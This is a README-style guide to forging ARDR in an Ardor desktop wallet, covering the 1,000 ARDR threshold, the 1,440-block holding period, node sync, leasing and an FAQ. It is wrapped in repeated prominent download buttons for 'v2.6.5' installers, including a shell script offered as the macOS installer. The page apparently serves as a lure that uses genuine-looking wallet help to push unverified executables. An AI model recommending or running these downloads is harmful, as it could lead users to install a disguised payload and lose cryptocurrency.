![Ardor Wallet guide](assets/banner-article.png)

# Start forging ARDR in the wallet, and why it may not start

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

To forge, hold at least 1,000 ARDR in effective balance for 24 hours - 1,440 blocks - keep a full node following the chain, and start forging from the account's menu in the wallet. If the wallet says not forging, the cause is almost always the balance threshold, an active lease, or a node that is not synced.

## Before you start

[Forging](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) is not a toggle that works from any state. Four conditions have to be true at the same time, and checking them first saves an hour of confusion.

| Condition | How to confirm it |
|---|---|
| At least 1,000 ARDR effective balance | The account screen shows the effective figure, not just the balance |
| Held for 1,440 blocks, about 24 hours | Effective balance updates after the holding period, not immediately |
| A full node following the chain | The block height is climbing and matches a public explorer |
| The account unlocked in the wallet | The passphrase-derived account is open, not a watched address |

The 24-hour figure catches people who fund an account and expect to forge the same afternoon. Until the effective [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) has been established for that period, the network does not count the coins.

The threshold also applies per account, so splitting a balance across two accounts can leave both below the minimum and neither forging. Keep the balance you intend to forge with in one account rather than distributing it for neatness.

## Turn forging on

1. Open the wallet on the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) tab and unlock the account that holds the ARDR.
2. Let the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) finish syncing. Forging from a node that is behind produces nothing.
3. Find the forging control in the account's menu and start it. The wallet shows a status line for the account.
4. Leave the wallet running. Closing it stops the node producing blocks.
5. Check the status again after a restart, because a stopped wallet does not resume forging on its own.

Step five is the one that quietly undoes a setup. A machine that reboots overnight comes back with the wallet closed, and the account forges nothing until somebody opens it again.

A laptop that sleeps has the same effect for a different reason: a sleeping machine is an offline node, however open the wallet looks when the lid goes down. If the machine must sleep, check the forging status after each wake rather than assuming it resumed.

## Why the wallet says not forging

| What you see | Cause | Fix |
|---|---|---|
| Forging off, balance below the threshold | Effective balance is under 1,000 ARDR | Add funds and wait the holding period |
| Forging off, balance looks sufficient | Funds arrived recently, so effective balance has not caught up | Wait the 1,440 blocks |
| Forging off with a lease shown | The account has leased its forging power away | Wait for the lease to expire, or lease from another account |
| Forging off, height frozen | Node is not syncing | Fix the sync before touching forging |
| Forging on but no blocks | Bad luck, or weight too small to expect frequent blocks | Check the network's block rate against your share |

The last row is not a fault. A small balance can be eligible and still go a long time between blocks, because selection is weighted. That is a property of the mechanism rather than a setting to correct.

## The threshold and the effective balance

The requirement is expressed as effective balance rather than balance, and the difference matters. Effective balance is the amount the network counts towards forging after the holding period; it is also the amount you can lease. Available balance is what you can spend.

An account that receives a large transfer therefore does not instantly gain forging weight. The effective figure catches up after the holding period, and only then does the account compete on the new amount.

An account that spends from its balance can drop back under the threshold, which silently removes the weight. That is the most common reason an account that forged last month forges nothing this month, and the plain balance figure alone does not show it.

## What happens on the network when you forge

A forged block is not a private event. The node publishes it to its peers, each of which validates the transactions, the signatures and the previous block reference before accepting it. A block that fails any check is discarded and the network moves on without it.

That is why the node has to be in sync. A block built on an old view of the chain references a block the network has moved past, and it is rejected. Forging from a node that is behind is not slower forging; it produces nothing at all.

## Forging yourself or leasing

Running your own node gives you the whole fee income and full control, at the cost of a machine that stays on. Leasing gives the weight to somebody else and leaves the payout to whatever you agreed with them. The first is a job, the second is an arrangement.

The deciding factor is usually whether the machine would be running anyway. On a desktop that is already on all day, forging is close to free. On a machine that exists only for this, electricity and update time usually argue for leasing instead.

## Leaving it running safely

A forging node is an online machine holding an unlocked account, which is a different risk profile from a wallet opened once a week. Practical measures: keep the machine patched, do not use it for browsing, and keep the passphrase off that machine's disk in any form.

For a balance large enough to worry about, leasing to an operator you trust is the alternative: the coins stay in your account, and the forging happens on somebody else's infrastructure.

## FAQ

### How long before I forge my first block?

It depends on your share of the total effective balance, and there is no schedule. A large balance may forge within hours; a balance just above the minimum may wait a long time.

### Can I forge and spend from the same account?

You can spend the available balance while forging, but spending reduces the balance and eventually the effective balance, which lowers your weight.

### Does forging use a lot of electricity?

No more than running any always-on desktop, because there is no computational race. The cost is the machine being on, not the work it does.

### Why did forging stop after I restarted the computer?

Because the wallet has to be open for the node to forge. Start the wallet and turn forging on again after a reboot.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md)
- [Lease ARDR and earn fees without running a node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md)
- [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
